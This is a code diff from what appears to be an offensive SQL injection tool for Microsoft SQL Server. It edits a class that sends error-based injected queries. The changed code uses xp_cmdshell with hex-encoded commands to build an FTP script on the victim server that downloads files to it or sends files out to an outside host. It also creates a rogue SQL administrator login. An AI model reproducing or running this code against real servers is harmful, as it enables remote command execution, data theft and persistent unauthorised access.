@@ -53,7 +53,7 @@ class ErrorBased(QtCore.QThread):
         elif self.vars['task'] == "enable_cmd": self.enableXpCmdShell()
         elif self.vars['task'] == "ftp": self.uploadFile()
         elif self.vars['task'] == "query":self.runQuery()
-        elif self.vars['task'] == "addSqlUser": self.addUser()
+        elif self.vars['task'] == "addSqlUser": self.addSqlUser()
         elif self.vars['task'] == "dump": self.syncThreads()
         return
         
@@ -82,7 +82,8 @@ class ErrorBased(QtCore.QThread):
         '${password}' : vars.setdefault('password'), 
         '${key}' : self.vars.setdefault('key'),
         '${column}' : vars.setdefault('column'), 
-        '${table}' : vars.setdefault('table')} 
+        '${table}' : vars.setdefault('table'), 
+        '${hex}' : vars.setdefault('hex'), } 
         for key in query_vars:
             query = query.replace(key, str(query_vars[key]))
         return query
@@ -376,7 +377,7 @@ class ErrorBased(QtCore.QThread):
         web.webRequest(self.vars, query, True)
         #echo password>> ..\temp\ftp.txt
         query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("echo " + self.vars['password'] + "> ..\\temp\\ftp.txt")})
+                                {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> ..\\temp\\ftp.txt")})
         web.webRequest(self.vars, query, True)
         for file in ftpFiles:
             #Use SEND or GET ftp command?
@@ -384,12 +385,11 @@ class ErrorBased(QtCore.QThread):
                 #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                 query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                     {'hex' : txtproc.strToHex("echo get " + file + " "\
-                                    + self.vars['filePath'] + "\\" + file + ">> ..\\temp\\ftp.txt")})
+                                    + self.vars['ftpPath'] + file + ">> ..\\temp\\ftp.txt")})
             else:
                 #echo send c:\path\file.exe>> ..\temp\ftp.txt
                 query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                    {'hex' : txtproc.strToHex("echo send " + self.vars['filePath'] +
-                                    "\\" +  file + ">> ..\\temp\\ftp.txt")})
+                                    {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']  +  file + ">> ..\\temp\\ftp.txt")})
             web.webRequest(self.vars, query, True)
         #echo bye>> ..\temp\ftp.txt
         query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
@@ -410,8 +410,8 @@ class ErrorBased(QtCore.QThread):
         self.msgSignal.emit("Enable OPENROWSET request sent.")
         
 #Add user request        
-    def addUser(self):
-        query =  self.buildQuery(error_based.mssql['exec_cmdshell'], 
+    def addSqlUser(self):
+        query =  self.buildQuery(error_based.mssql['add_sqladmin'], 
                                  {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
         web.webRequest(self.vars, query, True)
         self.msgSignal.emit("Add admin user request sent.")
